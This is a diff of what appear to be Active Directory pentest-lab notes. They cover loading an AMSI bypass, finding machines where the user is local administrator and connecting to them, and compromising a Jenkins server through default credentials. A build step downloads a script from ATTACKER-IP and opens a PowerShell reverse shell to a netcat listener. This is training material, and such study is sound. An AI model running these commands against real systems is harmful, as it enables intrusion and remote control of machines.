@@ -290,6 +290,12 @@ Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
 
 
 
+
+
+
+### **Get services with unquoted paths and a space in their name {Exploit}**
+
+
 - Cd to `C:\AD\Tools`
 - Load Invisi-shell
 - Load AMSI Bypass
@@ -301,8 +307,7 @@ Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
 ```
 
 
-
-### **Get services with unquoted paths and a space in their name {Exploit}**
+- Run the `Get-ServiceUnquoted` module to check for unquoted path
 
 
 ```powershell
@@ -326,20 +331,88 @@ We can see that the dcorp\studentx is a local administrator now. Just logoff and
 
 
 
+### **Identify a machine in the domain where present user has local administrative access**
+
+
+
+- Cd to `C:\AD\Tools`
+- Load Invisi-shell
+- Load AMSI Bypass
+- Load `Find-PSRemotingLocalAdminAccess.ps1` script
+
+
+```powershell
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+```
 
 
 
 
 
+- Fond local administrative access
+
+
+```powershell
+Find-PSRemotingLocalAdminAccess
+```
+
+
+
+![](https://i.imgur.com/6LJp7ia.png)
+
+
+
+- We can the connect to the machines found using `winrs` or `Enter-PSSession`(Powershell Remoting)
+
+
+
+```powershell
+# winrs
+winrs -r:dcorp-adminsrv cmd
+set username
+set computername
+
+# powershell remoting
+Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.loca
+$env:username
+```
+
+
+
+![](https://i.imgur.com/8ZevFtw.png)
 
 
 
 
+### **Jenkins**
+
+
+- Navigate to the Jenkins instance `http://172.16.3.11:8080`
+- Log in with default credentials, in this case `build:build`, or check google for **default Jenkins credentials**
+- Turn off all windows firewall settings
+- Start up `hfs.exe` (HTTP File Server) located under `C:\AD\Tools\`
+- Navigate to `/job/Project0/configure` (If you get a `403` keep changing Project0 to Project1, Pro...2, ..........3 till you get a `200`)
+- Scroll down to the option "**Build steps**" and on the drop down select/add "**Execute Windows Batch Command**" and enter-:
+
+```powershell
+powershell iex (iwr -UseBasicParsing http://ATTACKER-IP/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ATTACKER-IP -Port 443
+
+# Replace attacker IP with your IP Address, Run "ipconfig" to see it
+```
+
+- Start up your listener with `netcat.exe`
+
+```powershell
+C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+```
+
+
+- Hit **Apply** and then **Save** and on the left side bar, you should see a **Build Now** button, Click it.
+- You should then see your reverse shell as `dcorp-ci`
 
 
 
-
-
+![](https://i.imgur.com/Hf381f0.png)
 
 
 
